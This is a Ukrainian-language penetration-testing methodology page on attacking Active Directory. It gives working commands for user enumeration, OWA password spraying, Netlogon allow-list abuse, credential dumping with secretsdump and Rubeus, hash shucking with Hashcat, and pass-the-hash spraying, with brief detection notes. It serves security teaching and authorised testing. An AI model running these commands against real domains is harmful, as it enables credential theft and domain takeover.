# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Базовий огляд

**Active Directory** є фундаментальною технологією, яка дає змогу **мережевим адміністраторам** ефективно створювати та керувати **доменами**, **користувачами** й **об'єктами** в мережі. Її розроблено з можливістю масштабування для організації великої кількості користувачів у керовані **групи** та **підгрупи**, одночасно контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних рівнів: **доменів**, **дерев** і **лісів**. **Домен** охоплює набір об'єктів, таких як **користувачі** або **пристрої**, які використовують спільну базу даних. **Дерева** — це групи таких доменів, об'єднаних спільною структурою, а **ліс** — це набір кількох дерев, з'єднаних через **довірчі відносини**, що утворює найвищий рівень організаційної структури. На кожному з цих рівнів можна призначати конкретні **права доступу** та **комунікації**.

Ключові поняття в **Active Directory**:

1. **Directory** — містить усю інформацію, що стосується об'єктів Active Directory.
2. **Object** — позначає сутності в каталозі, зокрема **користувачів**, **групи** або **спільні папки**.
3. **Domain** — є контейнером для об'єктів каталогу; у межах **лісу** можуть існувати кілька доменів, кожен із власним набором об'єктів.
4. **Tree** — група доменів, які мають спільний кореневий домен.
5. **Forest** — найвищий рівень організаційної структури в Active Directory, що складається з кількох дерев із **довірчими відносинами** між ними.

**Active Directory Domain Services (AD DS)** охоплює низку служб, критично важливих для централізованого керування мережею та комунікації в ній. До цих служб належать:

1. **Domain Services** — централізує зберігання даних і керує взаємодією між **користувачами** та **доменами**, зокрема функціями **автентифікації** та **пошуку**.
2. **Certificate Services** — відповідає за створення, розповсюдження та керування захищеними **цифровими сертифікатами**.
3. **Lightweight Directory Services** — підтримує застосунки з підтримкою каталогів через **протокол LDAP**.
4. **Directory Federation Services** — надає можливості **єдиного входу (single sign-on)** для автентифікації користувачів у кількох вебзастосунках протягом одного сеансу.
5. **Rights Management** — допомагає захищати матеріали, захищені авторським правом, регулюючи їхнє несанкціоноване розповсюдження та використання.
6. **DNS Service** — має вирішальне значення для розпізнавання **доменних імен**.

Докладніше пояснення дивіться тут: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Автентифікація Kerberos**

Щоб навчитися **атакувати AD**, потрібно дуже добре **розуміти процес автентифікації Kerberos**.\
[**Перегляньте цю сторінку, якщо ви ще не знаєте, як це працює.**](kerberos-authentication.md)

## Шпаргалка

На [https://wadcoms.github.io/](https://wadcoms.github.io) можна знайти багато інформації для швидкого перегляду команд, які можна виконувати для перерахування/експлуатації AD.

> [!WARNING]
> Взаємодія Kerberos зазвичай **потребує повного доменного імені (FQDN)**, щоб клієнт міг отримати ticket для правильного SPN. Доступ до машини за IP-адресою зазвичай призводить до використання NTLM замість Kerberos.

## Розвідка Active Directory (без creds/сесій)

Якщо ви маєте доступ до середовища AD, але не маєте жодних облікових даних/сесій, ви можете:

- **Провести Pentest мережі:**
- Просканувати мережу, знайти машини та відкриті порти й спробувати **експлуатувати вразливості** або **отримати облікові дані** з них (наприклад, [принтери можуть бути дуже цікавими цілями](ad-information-in-printers.md)).
- Перерахування DNS може надати інформацію про ключові сервери в домені, зокрема web, принтери, shares, vpn, media тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ознайомтеся із загальною [**методологією Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md), щоб отримати більше інформації про те, як це робити.
- **Перевірити null- і Guest-доступ до smb-сервісів** (це не працюватиме в сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Докладніший посібник із перерахування SMB-сервера можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Перерахувати Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Докладніший посібник із перерахування LDAP можна знайти тут (зверніть **особливу увагу на анонімний доступ**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Отруїти мережу**
- Зібрати облікові дані, [**імітуючи служби за допомогою Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Отримати доступ до хоста, [**зловживаючи relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Зібрати облікові дані, **виставляючи** [**фальшиві UPnP-сервіси за допомогою evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягувати імена користувачів/імена з внутрішніх документів, соціальних мереж і сервісів (переважно web) у доменних середовищах, а також із загальнодоступних джерел.
- Якщо ви знайдете повні імена працівників компанії, можна спробувати різні **угоди щодо імен користувачів (**[**прочитайте це**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Найпоширеніші угоди: _NameSurname_, _Name.Surname_, _NamSur_ (по 3 літери кожного), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _випадкові літери та 3 випадкові цифри_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перерахування користувачів

- **Анонімне перерахування SMB/LDAP:** перегляньте сторінки [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) та [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Перерахування за допомогою Kerbrute**: коли запитується **недійсне ім'я користувача**, сервер відповідає кодом **помилки Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дає змогу визначити недійсність імені користувача. Для **дійсних імен користувачів** буде отримано або **TGT у відповіді AS-REP**, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, яка вказує, що користувач повинен пройти попередню автентифікацію.
- **Відсутність автентифікації проти MS-NRPC**: використання auth-level = 1 (відсутність автентифікації) проти інтерфейсу MS-NRPC (Netlogon) на контролерах домену. Метод викликає функцію `DsrGetDcNameEx2` після прив'язки до інтерфейсу MS-NRPC, щоб перевірити, чи існує користувач або комп'ютер, без будь-яких облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип перерахування. Дослідження можна знайти [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви виявили один із таких серверів у мережі, ви також можете виконати **перерахування користувачів щодо нього**. Наприклад, можна використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки імен користувачів у [**цьому github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) та в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Однак у вас мають бути **імена людей, які працюють у компанії**, отримані на етапі recon, який слід було виконати перед цим. Маючи ім'я та прізвище, ви могли б використати скрипт [**namemash.py**](https://gist.github.com/superkojiman/11076951) для генерації потенційно дійсних імен користувачів.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Навіть після виправлення **Zerologon** на DC облікові записи, явно додані до allow-list, усе ще можуть бути вразливими до **legacy/vulnerable Netlogon secure-channel behavior**. Небезпечною конфігурацією є GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** або відповідне значення реєстру **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Це значення є **SDDL security descriptor** (див. [Security Descriptors](security-descriptors.md)). Будь-який обліковий запис або група, якій надано відповідний ACE у DACL, можуть бути цілями атаки. Наприклад, `O:BAG:BAD:(A;;RC;;;WD)` фактично додає **Everyone** до allow-list.

Практичний workflow оператора:

1. **Визначте principals у allow-list**, перевіривши і **SYSVOL/GPO**, і **live DC registry**.
2. **Розшифруйте SID-и**, знайдені в SDDL, до реальних користувачів/комп'ютерів AD і надайте пріоритет **обліковим записам машин DC**, **trust accounts** та іншим привілейованим машинам.
3. Неодноразово намагайтеся виконати **MS-NRPC / Netlogon authentication** від імені облікового запису, доданого до allow-list.
4. Після успішного підбору використайте **Netlogon password-setting**, щоб скинути пароль цільового облікового запису (публічний PoC встановлює його як порожній рядок).<sup>[[9]](#references)[[10]](#references)</sup>

Приклади швидкого triage / lab із публічного артефакту:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Нотатки:

- **scanner** корисний, оскільки ефективний allow-list може знаходитися у **SYSVOL**, **registry** або в обох місцях.
- Сам exploit path важливий, оскільки після виявлення вразливого облікового запису він **не потребує привілеїв Domain Admin**.
- Компрометація **облікового запису комп'ютера Domain Controller**, наприклад `DC$`, особливо небезпечна, оскільки скидання цього пароля може безпосередньо уможливити ширші шляхи до **захоплення AD**.
- Можливість **brute-force** залежить від режиму: у публічному матеріалі описано підхід meet-in-the-middle, **24-бітний** brute force за наявності іншого облікового запису комп'ютера та повільніші **32-бітні** варіанти.

Нотатки щодо виявлення / hardening:

- Перевірте політику allow-list і видаліть усе, крім тимчасових, явно необхідних винятків сумісності.
- Відстежуйте події **System** на DC **5827/5828/5829/5830/5831**, щоб виявляти вразливі підключення Netlogon, які було відхилено, виявлено або явно дозволено політикою.
- Вважайте облікові записи у `VulnerableChannelAllowList` **високоризиковими**, доки не буде усунуто застарілу залежність.

### Знаючи одне або кілька імен користувачів

Отже, ви вже знаєте дійсне ім'я користувача, але не маєте паролів... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо користувач **не має** атрибута _DONT_REQ_PREAUTH_, можна **запросити повідомлення AS_REP** для цього користувача, яке міститиме дані, зашифровані похідним від пароля користувача.
- [**Password Spraying**](password-spraying.md): Спробуйте най**поширеніші паролі** для кожного з виявлених користувачів; можливо, хтось використовує слабкий пароль (зважайте на політику паролів!).
- Зверніть увагу, що також можна виконати **spray OWA servers**, щоб спробувати отримати доступ до поштових серверів користувачів.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Можливо, вам вдасться **отримати** challenge **hashes**, виконавши **poisoning** деяких протоколів **мережі**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Перерахування Active Directory надає облікові записи, хости та служби-кандидати, які можна змусити пройти автентифікацію. Використовуйте цей контекст, щоб визначити придатні [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM і потенційні шляхи до середовища AD.

### Розвідка на основі workspace NetExec і перевірка стану relay

- Використовуйте **`nxcdb` workspaces**, щоб зберігати стан розвідки AD окремо для кожного engagement: `workspace create <name>` створює окремі SQLite DB для кожного протоколу в `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap тощо). Перемикайте подання за допомогою `proto smb|mssql|winrm` і переглядайте зібрані секрети за допомогою `creds`. Після завершення вручну видаліть конфіденційні дані: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Швидке виявлення підмережі за допомогою **`netexec smb <cidr>`** показує **домен**, **збірку ОС**, **вимоги до SMB signing** і **Null Auth**. Члени, у яких відображається `(signing:False)`, є **вразливими до relay**, тоді як DC часто вимагають signing.
- Генеруйте **імена хостів у /etc/hosts** безпосередньо з виводу NetExec, щоб спростити націлювання:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Коли **SMB relay до DC заблоковано** через signing, усе одно перевіряйте стан **LDAP**: `netexec ldap <dc>` показує `(signing:None)` / слабке channel binding. DC із вимогою SMB signing, але з вимкненим LDAP signing, залишається придатною ціллю для **relay-to-LDAP** атак, таких як **SPN-less RBCD**.

### Витоки облікових даних через принтер → масова перевірка облікових даних домену

- Веб-інтерфейси принтерів іноді **містять замасковані паролі адміністраторів у HTML**. Перегляд вихідного коду/DevTools може розкрити пароль у відкритому вигляді (наприклад, `<input value="<password>">`), що дає змогу отримати Basic-auth доступ до репозиторіїв сканування/друку.
- Отримані завдання друку можуть містити **документи для онбордингу у відкритому вигляді** з паролями окремих користувачів. Під час тестування зберігайте відповідність між парами:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Викрадення NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або shares** за допомогою **null або guest user**, ви можете **розмістити файли** (наприклад, SCF-файл), які в разі доступу до них **ініціюють NTLM-аутентифікацію проти вас**, щоб ви могли **викрасти** **NTLM challenge** для його crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** розглядає кожен NT hash, який ви вже маєте, як кандидатний пароль для інших, повільніших форматів, матеріал ключа яких безпосередньо походить від NT hash. Замість brute-force довгих passphrase у Kerberos RC4 tickets, NetNTLM challenges або cached credentials, ви передаєте NT hashes у NT-candidate modes Hashcat і дозволяєте йому перевірити повторне використання паролів, не дізнаючись plaintext. Це особливо ефективно після компрометації домену, коли можна зібрати тисячі поточних та історичних NT hashes.<sup>[[5]](#references)</sup>

Використовуйте shucking, коли:

- У вас є NT corpus з DCSync, SAM/SECURITY dumps або credential vaults і потрібно перевірити повторне використання в інших domains/forests.
- Ви перехоплюєте Kerberos material на основі RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses або DCC/DCC2 blobs.
- Ви хочете швидко довести повторне використання довгих passphrase, які неможливо crack, і відразу виконати pivot через Pass-the-Hash.

Техніка **не працює** проти типів шифрування, ключі яких не є NT hash (наприклад, Kerberos etype 17/18 AES). Якщо домен застосовує лише AES, потрібно повернутися до звичайних password modes.

#### Створення NT hash corpus

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з history, щоб отримати якомога більший набір NT hashes (і їхні попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Записи history значно розширюють набір кандидатів, оскільки Microsoft може зберігати до 24 попередніх hashes для кожного account. Інші способи отримання NTDS secrets дивіться тут:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує локальні дані SAM/SECURITY і cached domain logons (DCC/DCC2). Видаліть дублікати та додайте ці hashes до того самого списку `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, які породили кожен hash (навіть якщо wordlist містить лише hex). Збіги hashes одразу покажуть, який principal повторно використовує пароль, коли Hashcat виведе знайдений candidate.
- Надавайте перевагу candidates з того самого forest або trusted forest; це максимізує ймовірність overlap під час shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- NT-candidate inputs **повинні залишатися raw 32-hex NT hashes**. Вимкніть rule engines (без `-r` і без hybrid modes), оскільки mangling пошкодить матеріал candidate key.
- Ці modes не є принципово швидшими, але NTLM keyspace (~30,000 MH/s на M3 Max) приблизно у 100 разів швидший за Kerberos RC4 (~300 MH/s). Перевірка curated NT list значно дешевша за дослідження всього password space у повільному форматі.
- Завжди запускайте **найновішу збірку Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки modes 31500/31600/35300/35400 з’явилися нещодавно.<sup>[[7]](#references)</sup>
- Наразі не існує NT mode для AS-REQ Pre-Auth, а AES etypes (19600/19700) потребують plaintext password, оскільки їхні ключі derivеd via PBKDF2 from UTF-16LE passwords, а не з raw NT hashes.

#### Приклад – Kerberoast RC4 (mode 35300)

1. Перехопіть RC4 TGS для target SPN за допомогою low-privileged user (деталі дивіться на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Виконайте shuck ticket за допомогою вашого NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derivеs RC4 key з кожного NT candidate і перевіряє `$krb5tgs$23$...` blob. Збіг підтверджує, що service account використовує один із ваших наявних NT hashes.

3. Негайно виконайте pivot через PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

За потреби plaintext можна відновити пізніше за допомогою `hashcat -m 1000 <matched_hash> wordlists/`.

#### Приклад – Cached credentials (mode 31600)

1. Зробіть dump cached logons із compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Скопіюйте рядок DCC2 для потрібного domain user у `dcc2_highpriv.txt` і виконайте shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Успішний збіг повертає NT hash, який уже відомий у вашому списку, і доводить, що cached user повторно використовує пароль. Використайте його безпосередньо для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або brute-force у fast NTLM mode, щоб відновити string.

Абсолютно той самий workflow застосовується до NetNTLM challenge-responses (`-m 27000/27100`) і DCC (`-m 31500`). Після ідентифікації збігу можна запустити relay, SMB/WMI/WinRM PtH або повторно crack NT hash за допомогою masks/rules offline.



## Перелік Active Directory WITH credentials/session

Для цієї фази потрібно **скомпрометувати credentials або session дійсного domain account.** Якщо у вас є valid credentials або shell від імені domain user, **пам’ятайте, що наведені раніше options усе ще можна використати для компрометації інших users**.

Перед початком authenticated enumeration зрозумійте **Kerberos double-hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Компрометація account є **важливим кроком для assessment домену**, оскільки вона забезпечує authenticated **Active Directory enumeration**:

Щодо [**ASREPRoast**](asreproast.md), тепер ви можете знайти кожного потенційно вразливого user, а щодо [**Password Spraying**](password-spraying.md) — отримати **список усіх usernames** і спробувати пароль скомпрометованого account, порожні паролі та нові promising passwords.

- Можна використати [**CMD для виконання basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використати [**powershell для recon**](../basic-powershell-for-pentesters/index.html), що буде stealthier
- Також можна [**використати powerview**](../basic-powershell-for-pentesters/powerview.md), щоб отримати детальнішу інформацію
- Ще одним чудовим tool для recon в active directory є [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежно від collection methods, які ви використовуєте), але **якщо вас це не турбує**, неодмінно спробуйте його. Знайдіть, де users можуть використовувати RDP, знайдіть шлях до інших groups тощо.
- **Інші automated AD enumeration tools:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), оскільки вони можуть містити цікаву інформацію.
- **Tool with GUI**, який можна використати для enumeration directory, — це **AdExplorer.exe** з **SysInternal** Suite.
- Також можна шукати в LDAP database за допомогою **ldapsearch**, щоб знаходити credentials у fields _userPassword_ та _unixUserPassword_ або навіть у _Description_. Див. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) щодо інших methods.
- Якщо ви використовуєте **Linux**, можна також виконувати enumeration domain за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Також можна спробувати automated tools:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Видобування всіх domain users**

Дуже легко отримати всі domain usernames у Windows (`net user /domain` ,`Get-DomainUser` або `wmic useraccount get name,sid`). У Linux можна використати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо цей розділ Enumeration здається коротким, це найважливіша частина всього процесу. Відкрийте links (передусім links для cmd, powershell, powerview і BloodHound), навчіться виконувати enumeration domain і практикуйтеся, доки не почуватиметеся впевнено. Під час assessment це буде ключовим моментом для пошуку шляху до DA або визначення, що нічого зробити неможливо.

### Kerberoast

Kerberoasting передбачає отримання **TGS tickets**, які використовуються services, пов’язаними з user accounts, і crack їхнього encryption, що базується на user passwords, **offline**.

Детальніше про це:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Отримавши credentials, можна перевірити, чи маєте ви доступ до будь-якої **machine**. Для цього можна використати **CrackMapExec**, щоб спробувати підключитися до кількох servers через різні protocols відповідно до результатів port scans.

### Local Privilege Escalation

Якщо ви скомпрометували credentials або session звичайного domain user і можете отримати доступ до **будь-якої machine у домені**, шукайте шлях для **локального підвищення привілеїв і збору credentials**. Local administrator privileges можуть дозволити вам **зробити dump hashes інших users** із memory (LSASS) і local storage (SAM).

У цій книзі є повна сторінка про [**local privilege escalation у Windows**](../windows-local-privilege-escalation/index.html) і [**checklist**](../checklist-windows-privilege-escalation.md). Також не забудьте використати [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Дуже **малоймовірно**, що ви знайдете **tickets** у current user, які **надають вам permission для доступу** до неочікуваних resources, але можна перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Маючи доменні облікові дані або сесію користувача, повторно перевірте NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): автентифіковане перерахування та техніки примусу можуть виявити relay-шляхи, які були недоступні під час неавтентифікованої розвідки.

### Пошук облікових даних у Computer Shares | SMB Shares

Тепер, коли у вас є базові облікові дані, слід перевірити, чи можете ви **знайти** **цікаві файли, до яких надано спільний доступ усередині AD**. Це можна зробити вручну, але це дуже нудне повторюване завдання (особливо якщо ви знайдете сотні документів, які потрібно перевірити).

[**Перейдіть за цим посиланням, щоб дізнатися про інструменти, які можна використовувати.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Викрадення NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або shares**, ви можете **розмістити файли** (наприклад, SCF-файл), які в разі певного доступу до них **ініціюють NTLM authentication проти вас**, щоб ви могли **викрасти** **NTLM challenge** для його зламу:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачу **скомпрометувати контролер домену**.


{{#ref}}
printnightmare.md
{{#endref}}

## Підвищення привілеїв в Active Directory З привілейованими обліковими даними/сесією

**Для наведених нижче технік звичайного доменного користувача недостатньо — для виконання цих атак потрібні спеціальні привілеї/облікові дані.**

### Витягування хешів

Сподіваємося, вам вдалося **скомпрометувати обліковий запис локального адміністратора**, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), включно з relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [локальним підвищенням привілеїв](../windows-local-privilege-escalation/index.html).\
Тепер настав час витягнути всі хеші з пам’яті та локальних систем.\
[**Прочитайте цю сторінку про різні способи отримання хешів.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Отримавши хеш користувача**, ви можете використати його, щоб **видати себе за нього**.\
Потрібно використати певний **інструмент**, який **виконає** **NTLM authentication за допомогою** цього **хешу**, **або** можна створити новий **sessionlogon** і **інжектувати** цей **хеш** у **LSASS**, щоб під час виконання будь-якої **NTLM authentication** використовувався саме **цей хеш**. Останній варіант використовує mimikatz.\
[**Прочитайте цю сторінку для отримання додаткової інформації.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака має на меті **використати NTLM-хеш користувача для запиту Kerberos tickets**, як альтернативу поширеному Pass The Hash через протокол NTLM. Тому це може бути особливо **корисним у мережах, де протокол NTLM вимкнено** і як протокол автентифікації дозволено лише **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** зловмисники **викрадають authentication ticket користувача** замість його пароля або значень хешів. Потім цей викрадений ticket використовується, щоб **видати себе за користувача** й отримати несанкціонований доступ до ресурсів і сервісів у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Повторне використання облікових даних

Якщо у вас є **хеш** або **пароль** **локального administrato**r, слід спробувати **локально увійти** до інших **ПК**, використовуючи його.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **noisy**, і **LAPS** може це **mitigate**.

### Зловживання MSSQL і Trusted Links

Якщо користувач має привілеї для **access MSSQL instances**, він може використати їх для **execute commands** на MSSQL host (якщо він працює від імені SA), **steal** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Якщо MSSQL instance є trusted через database link іншим instance, користувач із привілеями над linked database може **use the trust relationship to execute queries on the other instance**. Ці trust relationships можна об'єднувати в ланцюжки, і зрештою вони можуть привести до неправильно налаштованої database, де користувач зможе execute commands.\
**Links між databases працюють навіть через forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Зловживання платформами IT asset/deployment

Сторонні inventory та deployment suites часто відкривають потужні шляхи до credentials і code execution. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте domain privileges на цьому computer, ви зможете dump TGTs із пам'яті всіх користувачів, які входять до системи на цьому computer.\
Отже, якщо **Domain Admin входить до системи на computer**, ви зможете dump його TGT і impersonate його за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть можете **automatically compromise Print Server** (сподіваємося, ним буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувачу або computer дозволено "Constrained Delegation", він зможе **impersonate будь-якого користувача для access до певних services на computer**.\
Після цього, якщо ви **compromise hash** цього user/computer, ви зможете **impersonate будь-якого користувача** (навіть domain admins) для access до певних services.


{{#ref}}
constrained-delegation.md
